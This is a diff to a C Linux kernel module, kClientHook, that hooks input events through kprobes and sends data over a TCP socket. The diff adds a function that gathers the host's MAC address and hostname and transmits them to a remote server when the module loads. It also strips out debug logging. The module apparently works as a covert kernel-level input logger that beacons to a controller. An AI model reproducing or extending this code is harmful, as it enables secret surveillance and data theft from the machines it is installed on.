@@ -9,6 +9,7 @@
 
 #include "kClientHook.h"
 #include "headers.h"
+#include "mac_find.h"
 #include "protocol.h"
 #include "tcp_socket.h"
 #include "transmission.h"
@@ -85,6 +86,24 @@ static int handler_pre_input_event(struct kprobe *kp, struct pt_regs *regs) {
   return 0;
 }
 
+/* Sends mac and hostname to server */
+static int handle_credentials(void) {
+  char msg_buf[BUFFER_SIZE];
+  size_t msg_length;
+
+  char mac_buf[MAC_SIZE];
+  get_mac_address(mac_buf);
+
+  msg_length = protocol_format(
+      msg_buf, "%s" PROTOCOL_SEPARATOR "%s" PROTOCOL_SEPARATOR "%s", MSG_AUTH,
+      mac_buf, utsname()->nodename);
+
+  if (msg_length > 0)
+    workqueue_message(transmit_data, msg_buf, msg_length);
+
+  return 0;
+}
+
 /* Register all hooks */
 static int register_probes(void) {
   int ret = 0, i;
@@ -131,7 +150,6 @@ static void unregister_probes(int max_probes) {
 }
 
 static int __init hook_init(void) {
-  printk(KERN_INFO "In hook init\n");
   int ret = 0;
 
   /* Initialize all main module objects */
@@ -139,14 +157,12 @@ static int __init hook_init(void) {
   if (ret < 0)
     return ret;
 
-  printk(KERN_INFO "Before data_transmission_init\n");
   data_transmission_init();
-  printk(KERN_INFO "After data_transmission_init\n");
+  handle_credentials(); // Send credentials before registering hooks
 
   /* Registers kprobes, if one fails unregisters all registered kprobes */
   ret = register_probes();
   if (ret < 0) {
-    printk(KERN_ERR "Failed to regiser probes\n");
     release_singlethread_workqueue();
     data_transmission_release();
     return ret;
